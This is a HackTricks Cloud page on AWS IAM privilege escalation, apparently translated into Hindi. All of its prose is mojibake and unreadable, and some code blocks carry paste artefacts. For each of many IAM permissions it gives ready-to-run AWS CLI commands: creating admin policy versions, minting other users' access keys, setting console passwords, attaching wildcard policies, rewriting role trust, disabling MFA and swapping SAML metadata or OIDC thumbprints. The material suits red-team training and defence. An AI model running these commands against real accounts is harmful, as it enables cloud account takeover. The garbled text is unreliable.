# AWS - IAM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## IAM

IAM рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ:

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

рдирдП IAM рдиреАрддрд┐ рд╕рдВрд╕реНрдХрд░рдг рдмрдирд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, `iam:SetDefaultPolicyVersion` рдЕрдиреБрдорддрд┐ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЫреЛрдбрд╝рддреЗ рд╣реБрдП `--set-as-default` рдзреНрд╡рдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЗрд╕рд╕реЗ рдХрд╕реНрдЯрдо рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИред

**рд╢реЛрд╖рдг рдХрдорд╛рдВрдб:**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА рд╕рдВрд╕рд╛рдзрди рдкрд░ рдХрд┐рд╕реА рднреА рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдХрд░ рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рддрд╛ рд╣реИред

### **`iam:SetDefaultPolicyVersion`**

рдПрдХ IAM рдиреАрддрд┐ рдХреА рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдХрд┐рд╕реА рдЕрдиреНрдп рдореМрдЬреВрджрд╛ рд╕рдВрд╕реНрдХрд░рдг рдкрд░ рдмрджрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдпрджрд┐ рдирдпрд╛ рд╕рдВрд╕реНрдХрд░рдг рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╣реИред

**рдмреИрд╢ рдХрдорд╛рдВрдб:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**рдкреНрд░рднрд╛рд╡:** рдЕрдзрд┐рдХ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛ред

### **`iam:CreateAccessKey`**

рдПрдХ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкрд╣реБрдВрдЪ рдХреБрдВрдЬреА рдЖрдИрдбреА рдФрд░ рдЧреБрдкреНрдд рдкрд╣реБрдВрдЪ рдХреБрдВрдЬреА рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝ рд╕рдХрддрд╛ рд╣реИред

**рд╢реЛрд╖рдг:**
```bash
aws iam create-access-key --user-name <target_user>
```
**рдкреНрд░рднрд╛рд╡:** рдПрдХ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛рдХрд░ рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ред

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

рд▓реЙрдЧрд┐рди рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдпрд╛ рдЕрдкрдбреЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ AWS рдХрдВрд╕реЛрд▓ рд▓реЙрдЧрд┐рди рдХреЗ рд▓рд┐рдП рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬреЛ рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рддрдХ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред

**рдирд┐рд╖реЗрдз рдХрд╛ рд╢реЛрдз:**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**рдЕрджреНрдпрддрди рдХреЗ рд▓рд┐рдП рд╢рд╛рд░реНрдЯрдХрдЯ:**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**рдкреНрд░рднрд╛рд╡:** "рдХрд┐рд╕реА рднреА" рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдХреЗ рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдврд╝рд╛рдирд╛ред

### **`iam:UpdateAccessKey`**

рдЕрдХреНрд╖рдо рдХрд┐рдП рдЧрдП рдПрдХреНрд╕реЗрд╕ рдХреА рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдЕрдХреНрд╖рдо рдХреБрдВрдЬреА рдХреЗ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рд╣реИ рддреЛ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рд╢реЛрд╖рдг:** 

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**рдкреНрд░рднрд╛рд╡:** рдкрд╣реБрдВрдЪ рдХреБрдВрдЬреА рдХреЛ рдкреБрдирдГ рд╕рдХреНрд░рд┐рдп рдХрд░рдХреЗ рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ред

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

рдирд┐рд╢реБрд▓реНрдХ AWS рд╕реЗрд╡рд╛рдУрдВ (рдЬреИрд╕реЗ CodeCommit, Amazon Keyspaces) рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдг рдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдпрд╛ рд░реАрд╕реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреБрдбрд╝реЗ рд╣реБрдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрддрд╛ рд╣реИред

**рдирд┐рд╖реЗрдз рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг:**
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
**рд░реАрд╕реЗрдЯ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ:**

{% рдХреЛрдб рдУрд╡рд░рдлреНрд▓реЛ = "рд░реИрдк" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**рдкреНрд░рднрд╛рд╡:** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╕реЗрд╡рд╛ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рднреАрддрд░ рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ред

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рд╕рдореВрд╣реЛрдВ рдХреЛ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рд╕рдВрд▓рдЧреНрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рд╡реГрджреНрдзрд┐ рдХрд░рдХреЗ рд╕рдВрд▓рдЧреНрди рдиреАрддрд┐ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЕрдиреБрд╕рд░рдг рдХрд░рдиреЗред

**рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**рд╕рдореВрд╣ рдХреЗ рд▓рд┐рдП рд╢рд╛рд░реНрдЯрдХрдЯ:**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**рдкреНрд░рднрд╛рд╡:** рдиреАрддрд┐ рджреНрд╡рд╛рд░рд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐рд╕реА рднреА рдЪреАрдЬрд╝ рдХреЛ рд╕реАрдзреЗ рдЙрдиреНрдирдд рдХрд░рдирд╛ред

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

рд░реЛрд▓, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдпрд╛ рд╕рдореВрд╣реЛрдВ рдХреЛ рдиреАрддрд┐рдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдиреЗ рдпрд╛ рдбрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдкреНрд░рджрд╛рди рдХрд░рдХреЗ рд╕реАрдзреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдд рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИред

**рд░реЛрд▓ рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**рдЗрдирд▓рд╛рдЗрди рдиреАрддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкреАрдбрд╝рди:**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
рдЖрдк рдПрдХ рдиреАрддрд┐ рдЬреИрд╕реЗ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**рдкреНрд░рднрд╛рд╡:** рдиреАрддрд┐рдпреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЬреЛрдбрд╝рдХрд░ рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ред

### **`iam:AddUserToGroup`**

рдПрдХ рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдПрдХ IAM рд╕рдореВрд╣ рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдореВрд╣ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрдХрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд░рдирд╛ред

**рд╢реЛрд╖рдг:**
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**рдкреНрд░рднрд╛рд╡:** рд╕рдореВрд╣ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕реНрддрд░ рддрдХ рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ред

### **`iam:UpdateAssumeRolePolicy`**

рдПрдХ рднреВрдорд┐рдХрд╛ рдХреЗ рдорд╛рдирдиреЗ рдиреАрддрд┐ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рднреВрдорд┐рдХрд╛ рдХрд╛ рдорд╛рдирди рдФрд░ рдЙрд╕рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рд╢реЛрд╖рдг:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
рдЬрд╣рд╛рдВ рдиреАрддрд┐ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рджрд┐рдЦрддреА рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рднреВрдорд┐рдХрд╛ рдЕрдиреБрдорд╛рдирд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**рдкреНрд░рднрд╛рд╡:** рдХрд┐рд╕реА рднреА рднреВрдорд┐рдХрд╛ рдХреА рдЕрдиреБрдорд╛рдирд┐рдд рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЕрд╕реНрд╕реБрдо рдХрд░рдХреЗ рд╕реАрдзреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ред

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

рдХреЛрдбрдХрдорд┐рдЯ рдХреЗ рд▓рд┐рдП рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдФрд░ рдПрдордПрдлрдП рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛, рд╕рдВрднрд╛рд╡рд┐рдд рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреА рдУрд░ рд▓реЗ рдЬрд╛рддрд╛ рд╣реИред

**SSH рдХреБрдВрдЬреА рдЕрдкрд▓реЛрдб рдХреЗ рд▓рд┐рдП рд╢реЛрд╖рдг:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**MFA рдирд┐рд╖реЗрдз рдХреЗ рд▓рд┐рдП рдЙрддреНрдкреАрдбрд╝рди:**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**рдкреНрд░рднрд╛рд╡:** рдХреЛрдбрдХрдорд┐рдЯ рдПрдХреНрд╕реЗрд╕ рд╕рдХреНрд╖рдо рдХрд░рдХреЗ рдпрд╛ рдПрдордПрдлрдП рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдХреЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ред

### **`iam:ResyncMFADevice`**

рдПрдХ рдПрдордПрдлрдП рдЙрдкрдХрд░рдг рдХреА рдкреБрдирд░реНрд╕рдордХреНрд░рд┐рдпрд╛ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рдПрдордПрдлрдП рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рдирд┐рдкреБрд░реНрде рдХрд░рдХреЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдмреИрд╢ рдХрдорд╛рдВрдб:**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**рдкреНрд░рднрд╛рд╡:** MFA рдЙрдкрдХрд░рдг рдЬреЛрдбрд╝рдХрд░ рдпрд╛ рдкрд░рд┐рд╡рд░реНрддрди рдХрд░рдХреЗ рдЕрдкреНрд░рддреНрдпрдХреНрд╖ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ред

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

рдЗрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рдЖрдк **SAML рдХрдиреЗрдХреНрд╢рди рдХреЗ XML рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ**ред рдлрд┐рд░, рдЖрдк **SAML рд╕рдВрдШ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рднреА **рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдпрд╣ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдорд╛рди рд░рд╣рд╛ рд╣реИред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕реЗ рдХрд░рдиреЗ рдкрд░ **рд╡реИрдз рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд▓реЙрдЧрд┐рди рдирд╣реАрдВ рдХрд░рдиреЗ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗрдЧрд╛**ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк XML рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддрд╛рдХрд┐ рдЖрдк рдЕрдкрдирд╛ XML рдбрд╛рд▓ рд╕рдХреЗрдВ, рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХреЗрдВ рдФрд░ рдкрд┐рдЫрд▓рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХреЗрдВред
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
рдХрд╛рд░реНрдп: рдПрдХ рдЙрдкрдХрд░рдг рдЬреЛ SAML рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдФрд░ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рднреВрдорд┐рдХрд╛ рдХреЗ рд╕рд╛рде рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдирд┐рд╢реНрдЪрд┐рдд) рдпрджрд┐ рдХрд┐рд╕реА рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкрд╛рд╕ рдпреЗ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реИрдВ рддреЛ рд╡рд╣ рдкреНрд░рджрд╛рддрд╛ рдкрд░ рд╡рд┐рд╢реНрд╡рд╛рд╕ рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕рднреА рднреВрдорд┐рдХрд╛рдУрдВ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ **рдердВрдмрдкреНрд░рд┐рдВрдЯ** рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рд╣реИред

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## рд╕рдВрджрд░реНрдн

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
